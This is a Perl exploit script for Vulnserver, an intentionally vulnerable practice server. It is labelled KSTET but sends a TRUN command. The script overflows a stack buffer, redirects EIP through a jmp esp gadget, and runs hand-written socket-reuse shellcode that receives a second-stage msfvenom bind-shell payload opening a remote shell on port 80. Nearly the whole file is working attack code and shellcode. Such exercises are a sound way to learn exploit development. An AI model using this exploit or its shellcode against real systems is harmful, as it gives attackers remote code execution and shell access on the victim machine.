#!/usr/bin/perl

# Vulnserver KSTET exploit (https://github.com/stephenbradshaw/vulnserver)
# Tested against Microsoft Windows 7 Professional SP 1 English
# Second port will open on 9998 to accept payload
# Third port will open on 80 for bind shell

use IO::Socket;

if($ARGV[0] eq ''){
die("Proper usage: $0 IP_ADDRESS PORT_1 PORT_2\n\n");
}

$badheader = "TRUN /.:/";

#Stack offset 3
#EIP offset 2003
#ESP offset 2007
#EBP offset 1999
#Stack offset 2647

$baddata = "\x41" x 2003;

#   0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False
$baddata .= pack('V',0x62501203);

# socket
$baddata .= "\xBB\x11\x7C\x25\x40\xC1\xEB\x08\x33\xc0\xB0\x06\x50\xB0\x01\x50\x40\x50\xFF\xD3";

# bind
$baddata .= "\x8B\xF8\x56\x56\x56\x33\xC9\x66\xB9\x27\x0E\xC1\xE1\x10\x41\x41\x51\x8B\xCC\xB3\x64\x6A\x10\x51\x57\xFF\xD3";

# listen
$baddata .= "\xB3\x54\x6A\x7F\x57\xFF\xD3";

# accept
$baddata .= "\x56\x56\xB3\x4C\x57\xFF\xD3";

# malloc
$baddata .= "\x8B\xF8\x66\xBB\xC0\x2D\xB4\x02\x50\xFF\xD3";

# virtual protect
$baddata .= "\x59\x56\x51\x8B\xF0\x50\x66\xBB\x48\x2E\x8D\x44\x24\xDC\x50\x6A\x40\x51\x56\xFF\xD3";

# recv
$baddata .= "\x66\xBB\x2C\x25\x57\xFF\xD3\xFF\xE6";

$baddata .= "\xCC";

$baddata .= "\x41" x (5000-length($baddata));

# msfvenom -p windows/shell_bind_tcp LPORT=80 -b "\x00\x0a\x0d" -f perl -v payload
# Payload size 355 bytes

$payload = 
"\xdb\xd7\xbb\x26\x67\x4d\x96\xd9\x74\x24\xf4\x58\x31\xc9" .
"\xb1\x53\x83\xc0\x04\x31\x58\x13\x03\x7e\x74\xaf\x63\x82" .
"\x92\xad\x8c\x7a\x63\xd2\x05\x9f\x52\xd2\x72\xd4\xc5\xe2" .
"\xf1\xb8\xe9\x89\x54\x28\x79\xff\x70\x5f\xca\x4a\xa7\x6e" .
"\xcb\xe7\x9b\xf1\x4f\xfa\xcf\xd1\x6e\x35\x02\x10\xb6\x28" .
"\xef\x40\x6f\x26\x42\x74\x04\x72\x5f\xff\x56\x92\xe7\x1c" .
"\x2e\x95\xc6\xb3\x24\xcc\xc8\x32\xe8\x64\x41\x2c\xed\x41" .
"\x1b\xc7\xc5\x3e\x9a\x01\x14\xbe\x31\x6c\x98\x4d\x4b\xa9" .
"\x1f\xae\x3e\xc3\x63\x53\x39\x10\x19\x8f\xcc\x82\xb9\x44" .
"\x76\x6e\x3b\x88\xe1\xe5\x37\x65\x65\xa1\x5b\x78\xaa\xda" .
"\x60\xf1\x4d\x0c\xe1\x41\x6a\x88\xa9\x12\x13\x89\x17\xf4" .
"\x2c\xc9\xf7\xa9\x88\x82\x1a\xbd\xa0\xc9\x72\x72\x89\xf1" .
"\x82\x1c\x9a\x82\xb0\x83\x30\x0c\xf9\x4c\x9f\xcb\xfe\x66" .
"\x67\x43\x01\x89\x98\x4a\xc6\xdd\xc8\xe4\xef\x5d\x83\xf4" .
"\x10\x88\x3e\xfc\xb7\x63\x5d\x01\x07\xd4\xe1\xa9\xe0\x3e" .
"\xee\x96\x11\x41\x24\xbf\xba\xbc\xc7\xbf\x6a\x48\x21\xd5" .
"\x9a\x1c\xf9\x41\x59\x7b\x32\xf6\xa2\xa9\x6a\x90\xeb\xbb" .
"\xad\x9f\xeb\xe9\x99\x37\x60\xfe\x1d\x26\x77\x2b\x36\x3f" .
"\xe0\xa1\xd7\x72\x90\xb6\xfd\xe4\x31\x24\x9a\xf4\x3c\x55" .
"\x35\xa3\x69\xab\x4c\x21\x84\x92\xe6\x57\x55\x42\xc0\xd3" .
"\x82\xb7\xcf\xda\x47\x83\xeb\xcc\x91\x0c\xb0\xb8\x4d\x5b" .
"\x6e\x16\x28\x35\xc0\xc0\xe2\xea\x8a\x84\x73\xc1\x0c\xd2" .
"\x7b\x0c\xfb\x3a\xcd\xf9\xba\x45\xe2\x6d\x4b\x3e\x1e\x0e" .
"\xb4\x95\x9a\x3e\xff\xb7\x8b\xd6\xa6\x22\x8e\xba\x58\x99" .
"\xcd\xc2\xda\x2b\xae\x30\xc2\x5e\xab\x7d\x44\xb3\xc1\xee" .
"\x21\xb3\x76\x0e\x60";

$socket=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die("Could not connect to server on port $ARGV[1]");

$socket->recv($sd,1024);
print $sd;
$socket->send($badheader.$baddata);

sleep(2);

$socket2=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[2]"
)or die("Could not connect to server on port $ARGV[2] to send payload \n");

$socket2->send($payload);
